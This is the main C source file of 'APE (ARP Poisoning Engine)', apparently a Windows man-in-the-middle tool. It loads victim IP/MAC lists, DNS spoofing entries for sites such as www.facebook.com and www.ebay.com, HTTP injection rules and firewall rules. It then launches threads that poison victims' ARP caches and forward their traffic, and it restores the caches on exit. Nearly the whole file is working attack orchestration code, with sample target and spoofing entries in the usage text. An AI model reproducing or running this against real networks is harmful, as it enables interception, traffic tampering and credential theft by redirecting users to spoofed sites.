#define HAVE_REMOTE

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <pcap.h>
#include <iphlpapi.h>
#include <Shlwapi.h>
#include <stdarg.h>

#include "APE.h"
#include "ArpPoisoning.h"
#include "Interface.h"
#include "LinkedListSystems.h"
#include "LinkedListFirewallRules.h"
#include "LinkedListSpoofedDnsHosts.h"
#include "LinkedListHttpInjections.h"
#include "NetworkFunctions.h"
#include "HttpPoisoning.h"
#include "DnsPoisoning.h"
#include "DnsResponsePoisoning.h"
#include "PacketProxy.h"
#include "getopt.h"
#pragma comment(lib, "wpcap.lib")
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "IPHLPAPI.lib")


DWORD WINAPI StartArpPoisoning(LPVOID pScanParams);

/*
 * Extern variables
 *
 */
extern char *optarg;


/*
 * Global variables
 *
 */
CRITICAL_SECTION gDBCritSection;
CRITICAL_SECTION csSystemsLL;
CRITICAL_SECTION gCSOutputPipe;
CRITICAL_SECTION gCSConnectionsList;

// Linked lists
PSYSNODE gSystemsList = NULL;
PHOSTNODE gHostsList = NULL;
PRULENODE gFWRulesList = NULL;
PHTTPINJECTIONNODE gHttpInjectionList = NULL;

int gDEBUGLEVEL = DEBUG_LEVEL;


SCANPARAMS gScanParams;

HANDLE gRESENDThreadHandle = INVALID_HANDLE_VALUE;
HANDLE gSCANThreadHandle = INVALID_HANDLE_VALUE;
HANDLE gPOISONINGThreadHandle = INVALID_HANDLE_VALUE;
HANDLE gARPReplyThreadHandle = INVALID_HANDLE_VALUE;

DWORD gRESENDThreadID = 0;
DWORD gSCANThreadID = 0;
DWORD gPOISONINGThreadID = 0;
DWORD gARPReplyThreadID = 0;

int gExitProcess = NOK;
char **gARGV = NULL;




/*
 *
 * Main:  Program entry point
 *
 */

int main(int argc, char **argv)
{
	int retVal = 0;
	int opt = 0;
	char action = 0;
	int counter = 0;
	char *tempPtr = NULL;
	int funcRetVal = 0;
	char tempBuffer[MAX_BUF_SIZE + 1] = { 0 };

	char protocol[12] = { 0 };
	char srcIsStr[MAX_IP_LEN] = { 0 };
	unsigned short srcPortLower = 0;
	unsigned short srcPortUpper = 0;
	char dstIPStr[MAX_IP_LEN] = { 0 };
	unsigned short dstPortLower = 0;
	unsigned short dstPortUpper = 0;

	FILE *fileHandle = NULL;
	PRULENODE tempNode = NULL;

	unsigned char ipStr[MAX_IP_LEN];
	unsigned char macStr[MAX_MAC_LEN];
	unsigned char ipBin[BIN_IP_LEN];
	unsigned char macBin[BIN_MAC_LEN];
	char tempLine[MAX_BUF_SIZE + 1];


	/*
	 * Initialisation
	 */
	if (!InitializeCriticalSectionAndSpinCount(&gDBCritSection, 0x00000400) ||
      !InitializeCriticalSectionAndSpinCount(&csSystemsLL, 0x00000400) ||
      !InitializeCriticalSectionAndSpinCount(&gCSOutputPipe, 0x00000400) ||
      !InitializeCriticalSectionAndSpinCount(&gCSConnectionsList, 0x00000400))
	{
		retVal = 1;
		goto END;
	}


	LogMsg(DBG_LOW, "main(): Starting %s", argv[0]);
	ZeroMemory(&gScanParams, sizeof(gScanParams));
	gARGV = argv;


	gSystemsList = InitSystemList();
	gFWRulesList = InitFirewallRules();
	gHostsList = InitHostsList();
	gHttpInjectionList = InitHttpInjectionList();


	// Parse command line parameters
	while ((opt = getopt(argc, argv, "d:lx:")) != -1)
	{
		switch (opt)
		{
		case 'd':
			strncpy((char *)gScanParams.interfaceName, optarg, sizeof(gScanParams.interfaceName));
			GetInterfaceName(optarg, (char *)gScanParams.interfaceName, sizeof(gScanParams.interfaceName) - 1);
			GetInterfaceDetails(optarg, &gScanParams);
			break;
		case 'l':
			action = 'l';
			break;
		case 'x':
			action = 'x';
			strncpy(gScanParams.interfaceName, optarg, sizeof(gScanParams.interfaceName) - 1);
			GetInterfaceName(optarg, (char *)gScanParams.interfaceName, sizeof(gScanParams.interfaceName) - 1);
			GetInterfaceDetails(optarg, &gScanParams);
			break;
		}
	}

	/*
	 * List all interfaces
	 */
	if (action == 'l')
	{
		ListInterfaceDetails();
		goto END;


		/*
		 * ARP depoisening
		 *
		 * -d Ifc-Name
		 * -d  {...}
		 *
		 */
	}
	else if (argc == 3 && action == 'd')
	{
		AdminCheck(argv[0]);

		if (gDEBUGLEVEL > DBG_INFO)
			PrintConfig(gScanParams);

		ArpDePoisoning(&gScanParams);

		RemoveMacFromCache((char *)gScanParams.interfaceName, "*");
		Sleep(500);
		RemoveMacFromCache((char *)gScanParams.interfaceName, "*");
		goto END;



		/*
		 * All-in-one solution, target range
		 *
		 * param   Ifc-Name
		 *   -x     {...}
		 *
		 * 1. Parse input list
		 * 2. Parse firewall rules
		 * 3. ForwardPackets thread
		 * 4. StartARPPoisoning thread
		 *
		 */
	}
	else if (argc >= 3 && action == 'x')
	{
		AdminCheck(argv[0]);

		RemoveMacFromCache((char *)gScanParams.interfaceName, "*");
		Sleep(500);
		RemoveMacFromCache((char *)gScanParams.interfaceName, "*");
		LogMsg(2, "main(): %s\n", gScanParams.interfaceName);


		/*
		 * Initialisation. Parse parameters (Ifc, start IP, stop IP) and
		 * pack them in the scan configuration struct.
		 */
		MacBin2String(gScanParams.localMacBin, gScanParams.localMacStr, MAX_MAC_LEN);
		IpBin2String(gScanParams.localIpBin, gScanParams.localIpStr, MAX_IP_LEN);

		MacBin2String(gScanParams.gatewayMacBin, gScanParams.gatewayMacStr, MAX_MAC_LEN);
		IpBin2String(gScanParams.gatewayIpBin, gScanParams.gatewayIpStr, MAX_IP_LEN);

		// Set exit function to trigger depoisoning functions and command.
		SetConsoleCtrlHandler((PHANDLER_ROUTINE)APE_ControlHandler, TRUE);

		// Set GW IP static.
		SetMacStatic((char *)gScanParams.interfaceAlias, (char *)gScanParams.gatewayIpStr, (char *)gScanParams.gatewayMacStr);

    if (gDEBUGLEVEL > DBG_INFO)
    {
      PrintConfig(gScanParams);
    }

		// 0 Add default GW to the gSystemsList
		AddToSystemsList(&gSystemsList, gScanParams.gatewayMacBin, (char *)gScanParams.gatewayIpStr, gScanParams.gatewayIpBin);


		// 1. Parse target file
		if (!PathFileExists(FILE_HOST_TARGETS))
		{
			printf("No target hosts file \"%s\"!\n", FILE_HOST_TARGETS);
			goto END;
		}

		// MARKER : for unknown reasons I cant run this code inside a function -> crash!?!
		//    ParseTargetHostsConfigFile(FILE_HOST_TARGETS);
		if (FILE_HOST_TARGETS != NULL && (fileHandle = fopen(FILE_HOST_TARGETS, "r")) != NULL)
		{
			ZeroMemory(tempLine, sizeof(tempLine));
			ZeroMemory(ipStr, sizeof(ipStr));
			ZeroMemory(macStr, sizeof(macStr));
			ZeroMemory(ipBin, sizeof(ipBin));
			ZeroMemory(macBin, sizeof(macBin));

			while (fgets(tempLine, sizeof(tempLine), fileHandle) != NULL)
			{
        // Ignore trailing CR/LF
        while (tempLine[strlen(tempLine) - 1] == '\r' || tempLine[strlen(tempLine) - 1] == '\n')
        {
          tempLine[strlen(tempLine) - 1] = '\0';
        }

				// parse values and add them to the list.
				if (sscanf(tempLine, "%[^,],%s", ipStr, macStr) == 2)
				{
					MacString2Bin(macBin, macStr, strnlen((char *)macStr, sizeof(macStr) - 1));
					IpString2Bin(ipBin, ipStr, strnlen((char *)ipStr, sizeof(ipStr) - 1));

					AddToSystemsList(&gSystemsList, macBin, (char *)ipStr, ipBin);
					LogMsg(DBG_MEDIUM, "ParseTargetHostsConfigFile(): New system added :  %s/%s", macStr, ipStr);

					SetMacStatic((char *)gScanParams.interfaceAlias, (char *)ipStr, (char *)macStr);
				}

				ZeroMemory(tempLine, sizeof(tempLine));
				ZeroMemory(ipStr, sizeof(ipStr));
				ZeroMemory(macStr, sizeof(macStr));
				ZeroMemory(ipBin, sizeof(ipBin));
				ZeroMemory(macBin, sizeof(macBin));
			}

			fclose(fileHandle);
		}

		WriteDepoisoningFile();

		// 2. Parse DNS Poisoning, HTTP injection and Firewall files
		if (PathFileExists(FILE_DNS_POISONING))
		{
			ParseDNSPoisoningConfigFile(FILE_DNS_POISONING);
			DetermineSpoofingResponseData(&gScanParams);
		}

    if (PathFileExists(FILE_HTTPINJECTION_RULES1))
    {
      ParseHtmlInjectionConfigFile(FILE_HTTPINJECTION_RULES1);
    }
    else if (PathFileExists(FILE_HTTPINJECTION_RULES2))
    {
      ParseHtmlInjectionConfigFile(FILE_HTTPINJECTION_RULES2);
    }


		if ((fileHandle = fopen(FILE_FIREWALL_RULES1, "r")) != NULL || (fileHandle = fopen(FILE_FIREWALL_RULES2, "r")) != NULL)
		{
			printf("main(): Parsing firewall rules file \"%s\"\n", FILE_FIREWALL_RULES1);
			while (!feof(fileHandle))
			{
				fgets(tempBuffer, sizeof(tempBuffer), fileHandle);
				ZeroMemory(srcIsStr, sizeof(srcIsStr));
				ZeroMemory(dstIPStr, sizeof(dstIPStr));

				// Remove all trailing NL/LF 
        while (tempBuffer[strnlen(tempBuffer, sizeof(tempBuffer)) - 1] == '\r' || tempBuffer[strnlen(tempBuffer, sizeof(tempBuffer)) - 1] == '\n')
        {
          tempBuffer[strnlen(tempBuffer, sizeof(tempBuffer)) - 1] = 0;
        }

        if ((funcRetVal = sscanf(tempBuffer, "%[^:]:%[^:]:%hu:%hu:%[^:]:%hu:%hu", protocol, srcIsStr, &srcPortLower, &srcPortUpper, dstIPStr, &dstPortLower, &dstPortUpper)) != 7 ||
            tempBuffer[0] == '#')
        {
          continue;
        }

				if ((tempNode = (PRULENODE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(RULENODE))) != NULL)
				{
					ZeroMemory(tempNode, sizeof(RULENODE));

					tempNode->DstIPBin = inet_addr(dstIPStr);
					strncpy(tempNode->DstIPStr, dstIPStr, sizeof(tempNode->DstIPStr) - 1);
					tempNode->DstPortLower = dstPortLower;
					tempNode->DstPortUpper = dstPortUpper;

					tempNode->SrcIPBin = inet_addr(srcIsStr);
					strncpy(tempNode->SrcIPStr, srcIsStr, sizeof(tempNode->SrcIPStr) - 1);
					tempNode->SrcPortLower = srcPortLower;
					tempNode->SrcPortUpper = srcPortUpper;

					strncpy(tempNode->Protocol, protocol, sizeof(tempNode->Protocol) - 1);
					snprintf(tempNode->Descr, sizeof(tempNode->Descr) - 1, "%s %s:(%d-%d) -> %s:(%d-%d)", tempNode->Protocol, tempNode->SrcIPStr, tempNode->SrcPortLower, tempNode->SrcPortUpper, tempNode->DstIPStr, tempNode->DstPortLower, tempNode->DstPortUpper);

					AddRuleToList(&gFWRulesList, tempNode);
				}				
			}

			fclose(fileHandle);
		}

		// 1. Start Ethernet FORWARDING thread
		if ((gRESENDThreadHandle = CreateThread(NULL, 0, ForwardPackets, &gScanParams, 0, &gRESENDThreadID)) == NULL)
		{
			LogMsg(DBG_ERROR, "main(): Can't start Listener thread : %d", GetLastError());
			goto END;
		}

		// 2. Start POISONING the ARP caches.
		if ((gPOISONINGThreadHandle = CreateThread(NULL, 0, StartArpPoisoning, &gScanParams, 0, &gPOISONINGThreadID)) == NULL)
		{
			LogMsg(DBG_ERROR, "main(): Can't start NetworkScanner thread : %d", GetLastError());
			goto END;
		}

		Sleep(500);
		while (gPOISONINGThreadHandle != INVALID_HANDLE_VALUE && gRESENDThreadHandle != INVALID_HANDLE_VALUE)
		{
			if (WaitForSingleObject(gPOISONINGThreadHandle, 30) != WAIT_TIMEOUT)
				break;

			if (WaitForSingleObject(gRESENDThreadHandle, 30) != WAIT_TIMEOUT)
				break;

			Sleep(50);
		}

		// MARKER : CORRECT THREAD SHUTDOWN!!
		printf("OOPS!! MAKE SURE THE THREAD GETS SHUT DOWN CORRECTLY!!\n");
	}
	else
	{
		PrintUsage(argv[0]);
	}

END:

	DeleteCriticalSection(&gDBCritSection);
	DeleteCriticalSection(&csSystemsLL);
	DeleteCriticalSection(&gCSOutputPipe);
	DeleteCriticalSection(&gCSConnectionsList);

	LogMsg(DBG_LOW, "main(): Stopping %s", argv[0]);

	return retVal;
}



void PrintUsage(char *pAppName)
{
	system("cls");
	printf("\nAPE (ARP Poisoning Engine) Version %s\n", APE_VERSION);
	printf("---------------------------------------\n\n");
	printf("List all interfaces               :  %s -l\n", pAppName);
	printf("Start poisoning and forwarding    :  %s -x IFC-Name\n", pAppName);
	printf("Start depoisoning target systems  :  %s -d IFC-Name\n", pAppName);
	printf("\n\n\nAdd the ARP cache poisoning target system IP and MAC addresses \nto the file .targethosts\n\n");
	printf("192.168.0.58,00:1B:77:53:5C:F8\n");
	printf("192.168.0.59,00:3A:21:3C:11:27\n");
	printf("\n\n\nAdd the DNS poisoning target host names and the spoofed IP \naddresses to the file .dnshosts\n\n");
	printf("www.facebook.com,192.168.0.58\n");
	printf("www.ebay.com,192.168.0.58\n");
	printf("\n\n\nAdd the system data from blocked connections\nto the file .fwrules\n\n");
	printf("TCP:192.168.0.4:1:65535:0.0.0.0:80:80\n");
	printf("UDP:192.168.0.4:1:65535:7.7.7.7:53:53\n");
	printf("\n\n\n\nExamples\n--------\n\n");
	printf("Example : %s -x 0F716AAF-D4A7-ACBA-1234-EA45A939F624\n\n\n\n\n", pAppName);
	printf("WinPcap version\n---------------\n\n");
	printf("%s\n\n", pcap_lib_version());
}




void Stringify(unsigned char *inputParam, int inputLenthParam, unsigned char *outputParam)
{
	int counter = 0;

  if (inputParam == NULL || outputParam == NULL)
  {
    return;
  }

	for (; counter < inputLenthParam && inputParam[counter] != '\0'; counter++)
	{
		//    if (pInput[lCounter] < 32 || pInput[lCounter] > 176)
    if (inputParam[counter] < 32 || inputParam[counter] > 126)
    {
      outputParam[counter] = '.';
    }
    else
    {
      outputParam[counter] = inputParam[counter];
    }
	}
}



void LogMsg(int priorityParam, char *logMessageParam, ...)
{
	HANDLE fileHandle = INVALID_HANDLE_VALUE;
	OVERLAPPED overlapped = { 0 };
	char dateStamp[MAX_BUF_SIZE + 1];
	char timeStamp[MAX_BUF_SIZE + 1];
	char time[MAX_BUF_SIZE + 1];
	char tempBuffer[MAX_BUF_SIZE + 1];
	char logMessage[MAX_BUF_SIZE + 1];
	DWORD bytesWritten = 0;
	va_list args;


	if (priorityParam >= DEBUG_LEVEL && DEBUG_LEVEL != DBG_OFF)
	{
		if ((fileHandle = CreateFile(DBG_LOGFILE, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0)) != INVALID_HANDLE_VALUE)
		{
			ZeroMemory(&overlapped, sizeof(overlapped));

			if (LockFileEx(fileHandle, LOCKFILE_EXCLUSIVE_LOCK, 0, 0, 0, &overlapped) == TRUE)
			{
				ZeroMemory(time, sizeof(time));
				ZeroMemory(timeStamp, sizeof(timeStamp));
				ZeroMemory(dateStamp, sizeof(dateStamp));


				// Create timestamp
				_strtime(timeStamp);
				_strdate(dateStamp);
				snprintf(time, sizeof(time) - 1, "%s %s", dateStamp, timeStamp);

				// Create log message
				ZeroMemory(tempBuffer, sizeof(tempBuffer));
				ZeroMemory(logMessage, sizeof(logMessage));
				va_start(args, logMessageParam);
				vsprintf(tempBuffer, logMessageParam, args);
				va_end(args);
				snprintf(logMessage, sizeof(logMessage) - 1, "%s : %s\n", time, tempBuffer);
				printf(logMessage);

				// Write message to the logfile.
				SetFilePointer(fileHandle, 0, NULL, FILE_END);
				WriteFile(fileHandle, logMessage, strnlen(logMessage, sizeof(logMessage) - 1), &bytesWritten, NULL);
				UnlockFileEx(fileHandle, 0, 0, 0, &overlapped);
			}

			CloseHandle(fileHandle);
		}
	}
}




BOOL APE_ControlHandler(DWORD pControlType)
{

	switch (pControlType)
	{
		// Handle the CTRL-C signal. 
	case CTRL_C_EVENT:
		LogMsg(DBG_INFO, "Ctrl-C event : Starting depoisoning process");
		StartUnpoisoningProcess();
		return FALSE;

	case CTRL_CLOSE_EVENT:
		LogMsg(DBG_INFO, "Ctrl-Close event : Starting depoisoning process");
		StartUnpoisoningProcess();
		return FALSE;

	case CTRL_BREAK_EVENT:
		LogMsg(DBG_INFO, "Ctrl-Break event : Starting depoisoning process");
		StartUnpoisoningProcess();
		return FALSE;

	case CTRL_LOGOFF_EVENT:
		printf("Ctrl-Logoff event : Starting depoisoning process");
		StartUnpoisoningProcess();
		return FALSE;

	case CTRL_SHUTDOWN_EVENT:
		LogMsg(DBG_INFO, "Ctrl-Shutdown event : Starting depoisoning process");
		StartUnpoisoningProcess();
		return FALSE;

	default:
		LogMsg(DBG_INFO, "Unknown event \"%d\" : Starting depoisoning process", pControlType);
		StartUnpoisoningProcess();
		return FALSE;
	}
}




void WriteDepoisoningFile(void)
{
	int counter = 0;
	int numberSystems = 0;
	SYSTEMNODE systemList[MAX_SYSTEMS_COUNT];
	FILE *fileHandle = NULL;
	char tempBuffer[MAX_BUF_SIZE + 1];
	char srcMacStr[MAX_BUF_SIZE + 1];
	PSYSNODE systemListPtr = gSystemsList;


	// Get a copy of all systems found in the network.
	while (systemListPtr != NULL)
	{
		ZeroMemory(srcMacStr, sizeof(srcMacStr));
		MacBin2String(systemListPtr->data.sysMacBin, (unsigned char *)srcMacStr, sizeof(srcMacStr));
		LogMsg(DBG_INFO, "writeDepoisoningFile(): %s/%s", systemListPtr->data.sysIpStr, srcMacStr);

		if (strnlen((char *)systemListPtr->data.sysIpStr, MAX_IP_LEN) > 0)
		{
			CopyMemory(systemList[numberSystems].sysIpStr, systemListPtr->data.sysIpStr, MAX_IP_LEN);
			CopyMemory(systemList[numberSystems].sysMacBin, systemListPtr->data.sysMacBin, BIN_MAC_LEN);
			numberSystems++;
		}

		systemListPtr = systemListPtr->next;
	}

	// Depoison the victim systems
	if (numberSystems > 0)
	{
		LogMsg(DBG_INFO, "writeDepoisoningFile(): Depoison  %d systems", numberSystems);

		if ((fileHandle = fopen(FILE_UNPOISON, "w")) != NULL)
		{
			counter = 0;

			while (counter < numberSystems && counter < MAX_SYSTEMS_COUNT)
			{
				if (systemList[counter].sysIpStr != NULL && strnlen((char *)systemList[counter].sysIpStr, MAX_IP_LEN) > 0 &&
					systemList[counter].sysMacBin != NULL)
				{
					ZeroMemory(tempBuffer, sizeof(tempBuffer));
					snprintf(tempBuffer, sizeof(tempBuffer) - 1, "%02hhX:%02hhX:%02hhX:%02hhX:%02hhX:%02hhX", systemList[counter].sysMacBin[0], systemList[counter].sysMacBin[1],
						systemList[counter].sysMacBin[2], systemList[counter].sysMacBin[3], systemList[counter].sysMacBin[4], systemList[counter].sysMacBin[5]);

					fprintf(fileHandle, "%s,%s\n", systemList[counter].sysIpStr, tempBuffer);
				}

				counter++;
			}

			fclose(fileHandle);
		}
	}
}




void StartUnpoisoningProcess()
{
	char tempBuffer[MAX_BUF_SIZE + 1];
	char gatewayIpStr[MAX_BUF_SIZE + 1];

	// Start unpoison process.
	ZeroMemory(tempBuffer, sizeof(tempBuffer));
	snprintf(tempBuffer, sizeof(tempBuffer) - 1, "\"%s\" -d %s", gARGV[0], gARGV[2]);
	LogMsg(DBG_INFO, "startUnpoisoningProcess(): Starting Depoison child process");
	ExecCommand(tempBuffer);

	// Remove GW ARP entry.
	ZeroMemory(tempBuffer, sizeof(tempBuffer));
	ZeroMemory(gatewayIpStr, sizeof(gatewayIpStr));

	snprintf(gatewayIpStr, sizeof(gatewayIpStr) - 1, "%d.%d.%d.%d", gScanParams.gatewayIpBin[0], gScanParams.gatewayIpBin[1], gScanParams.gatewayIpBin[2], gScanParams.gatewayIpBin[3]);

	RemoveMacFromCache((char *)gScanParams.interfaceAlias, gatewayIpStr);
}


/*
 *
 *
 */
void ExecCommand(char *commandParam)
{
	STARTUPINFO startupInfo;
	PROCESS_INFORMATION processInfo;
	char tempBuffer[MAX_BUF_SIZE + 1];
	char *comspec = getenv("COMSPEC");


	// Build command string + execute it.
	if (commandParam != NULL)
	{
		ZeroMemory(&startupInfo, sizeof(startupInfo));
		ZeroMemory(&processInfo, sizeof(processInfo));
		ZeroMemory(tempBuffer, sizeof(tempBuffer));

		comspec = comspec != NULL ? comspec : "cmd.exe";

		startupInfo.cb = sizeof(STARTUPINFO);
		startupInfo.dwFlags = STARTF_USESHOWWINDOW;
		startupInfo.wShowWindow = SW_HIDE;

		snprintf(tempBuffer, sizeof(tempBuffer) - 1, "%s /c %s", comspec, commandParam);
		LogMsg(DBG_INFO, "ExecCommand(): %s", tempBuffer);

		CreateProcess(NULL, tempBuffer, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &startupInfo, &processInfo);
	}
}



/*
 *
 *
 */
void PrintConfig(SCANPARAMS scanParamsParam)
{
	printf("Local IP :\t%d.%d.%d.%d\n", scanParamsParam.localIpBin[0], scanParamsParam.localIpBin[1], scanParamsParam.localIpBin[2], scanParamsParam.localIpBin[3]);
	printf("Local MAC :\t%02hhX-%02hhX-%02hhX-%02hhX-%02hhX-%02hhX\n", scanParamsParam.localMacBin[0], scanParamsParam.localMacBin[1], scanParamsParam.localMacBin[2],
		scanParamsParam.localMacBin[3], scanParamsParam.localMacBin[4], scanParamsParam.localMacBin[5]);
	printf("GW MAC :\t%02hhX-%02hhX-%02hhX-%02hhX-%02hhX-%02hhX\n", scanParamsParam.gatewayMacBin[0], scanParamsParam.gatewayMacBin[1], scanParamsParam.gatewayMacBin[2],
		scanParamsParam.gatewayMacBin[3], scanParamsParam.gatewayMacBin[4], scanParamsParam.gatewayMacBin[5]);
	printf("GW IP :\t\t%d.%d.%d.%d\n", scanParamsParam.gatewayIpBin[0], scanParamsParam.gatewayIpBin[1], scanParamsParam.gatewayIpBin[2], scanParamsParam.gatewayIpBin[3]);
	printf("Start IP :\t%d.%d.%d.%d\n", scanParamsParam.startIpBin[0], scanParamsParam.startIpBin[1], scanParamsParam.startIpBin[2], scanParamsParam.startIpBin[3]);
	printf("Stop IP :\t%d.%d.%d.%d\n", scanParamsParam.stopIpBin[0], scanParamsParam.stopIpBin[1], scanParamsParam.stopIpBin[2], scanParamsParam.stopIpBin[3]);
}


/*
 *
 *
 */
void PrintTimestamp(char *titleParam)
{
	SYSTEMTIME st;
	GetSystemTime(&st);

	printf("[ %s - %d:%d:%d.%.3d ]\n", titleParam, st.wHour, st.wMinute, st.wSecond, st.wMilliseconds);
}



int UserIsAdmin()
{
	BOOL retVal = FALSE;
	SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
	PSID admGroup = NULL;


	if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &admGroup))
	{
		if (!CheckTokenMembership(NULL, admGroup, &retVal))
			retVal = FALSE;
		FreeSid(admGroup);
	}

	return retVal;
}



void AdminCheck(char *programNameParam)
{

	// The user needs adminstrator privileges to 
	// run APE successfully.
	if (!UserIsAdmin())
	{
		system("cls");
		printf("\nAPE (ARP Poisoning Engine)  Version %s\n", APE_VERSION);
		printf("---------------------------------------\n\n");
		printf("Web\t https://github.com/rubenunteregger\n\n\n");
		printf("You need Administrator permissions to run %s successfully!\n\n", programNameParam);

		exit(1);
	}
}


/*
 *
 *
 */
void ParseTargetHostsConfigFile(char *targetsFileParam)
{
	unsigned char ipStr[MAX_IP_LEN];
	unsigned char macStr[MAX_MAC_LEN];
	unsigned char ipBin[BIN_IP_LEN];
	unsigned char macBin[BIN_MAC_LEN];
	FILE *fileHandle = NULL;
	char tempLine[MAX_BUF_SIZE + 1];


	if (targetsFileParam != NULL && (fileHandle = fopen(targetsFileParam, "r")) != NULL)
	{
		ZeroMemory(tempLine, sizeof(tempLine));
		ZeroMemory(ipStr, sizeof(ipStr));
		ZeroMemory(macStr, sizeof(macStr));
		ZeroMemory(ipBin, sizeof(ipBin));
		ZeroMemory(macBin, sizeof(macBin));

		while (fgets(tempLine, sizeof(tempLine), fileHandle) != NULL)
		{
      while (tempLine[strlen(tempLine) - 1] == '\r' || tempLine[strlen(tempLine) - 1] == '\n')
      {
        tempLine[strlen(tempLine) - 1] = '\0';
      }

			// parse values and add them to the list.
			if (sscanf(tempLine, "%[^,],%s", ipStr, macStr) == 2)
			{
				MacString2Bin(macBin, macStr, strnlen((char *)macStr, sizeof(macStr) - 1));
				IpString2Bin(ipBin, ipStr, strnlen((char *)ipStr, sizeof(ipStr) - 1));

				AddToSystemsList(&gSystemsList, macBin, (char *)ipStr, ipBin);
				LogMsg(DBG_MEDIUM, "ParseTargetHostsConfigFile(): New system added :  %s/%s", macStr, ipStr);
			}

			ZeroMemory(tempLine, sizeof(tempLine));
			ZeroMemory(ipStr, sizeof(ipStr));
			ZeroMemory(macStr, sizeof(macStr));
			ZeroMemory(ipBin, sizeof(ipBin));
			ZeroMemory(macBin, sizeof(macBin));
		}

		fclose(fileHandle);
	}

	return;
}